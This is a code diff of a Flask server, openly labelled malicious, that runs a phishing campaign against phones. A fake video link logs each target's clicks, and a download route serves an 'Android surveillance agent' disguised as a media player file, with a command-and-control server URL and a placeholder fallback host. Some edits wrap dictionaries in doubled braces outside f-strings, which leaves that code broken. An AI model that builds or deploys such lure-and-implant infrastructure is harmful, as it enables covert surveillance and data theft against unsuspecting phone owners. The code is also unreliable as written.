@@ -6,7 +6,7 @@ import os
 app = Flask(__name__)
 
 def get_c2_url():
-    return os.environ.get('C2_URL', request.host_url.replace('8080', '5000').rstrip('/'))
+    return os.environ.get('C2_URL', '')
 
 def get_db_connection():
     conn = sqlite3.connect('mp_agent.db')
@@ -65,18 +65,25 @@ MALICIOUS_HTML = """
 </html>
 """
 
+@app.route('/')
+def index():
+    return jsonify({
+        'status': 'online',
+        'server': 'mp_agent_malicious',
+        'timestamp': datetime.now().isoformat()
+    })
+
 @app.route('/video')
 def fake_video():
     phone_id = request.args.get('phone', 'unknown')
-    user_ip = request.remote_addr
     
-    print(f"🎯 User accessed fake video: {phone_id} from {user_ip}")
+    print(f"🎯 User accessed fake video: {phone_id}")
     
     try:
         conn = get_db_connection()
         conn.execute(
             'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-            (phone_id, 'malicious_link', f'User clicked video link from {user_ip}', 'clicked', datetime.now())
+            (phone_id, 'malicious_link', f'User clicked video link', 'clicked', datetime.now())
         )
         conn.commit()
         conn.close()
@@ -88,15 +95,14 @@ def fake_video():
 @app.route('/download_agent')
 def download_agent():
     phone_id = request.args.get('phone', 'unknown')
-    user_ip = request.remote_addr
     
-    print(f"📥 Agent download triggered for: {phone_id} from {user_ip}")
+    print(f"📥 Agent download triggered for: {phone_id}")
     
     try:
         conn = get_db_connection()
         conn.execute(
             'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-            (phone_id, 'malicious_link', f'Agent download initiated from {user_ip}', 'downloaded', datetime.now())
+            (phone_id, 'malicious_link', f'Agent download initiated', 'downloaded', datetime.now())
         )
         conn.commit()
         conn.close()
@@ -104,11 +110,10 @@ def download_agent():
         print(f"Download logging failed: {e}")
     
     c2_url = get_c2_url()
+    if not c2_url:
+        c2_url = "https://your-c2-server.onrender.com"  # Fallback
     
     agent_code = f'''# MP_AGENT - REAL ANDROID SURVEILLANCE AGENT
-# Agent ID: {phone_id}
-# C2 Server: {c2_url}
-
 import requests
 import time
 import os
@@ -220,18 +225,18 @@ if __name__ == "__main__":
     return Response(
         agent_code,
         mimetype='text/python',
-        headers={
+        headers={{
             'Content-Disposition': f'attachment; filename="media_player_{phone_id}.py"'
-        }
+        }}
     )
 
 @app.route('/health')
 def health_check():
-    return jsonify({
+    return jsonify({{
         'status': 'healthy',
         'server': 'malicious_server',
         'timestamp': datetime.now().isoformat()
-    })
+    }})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
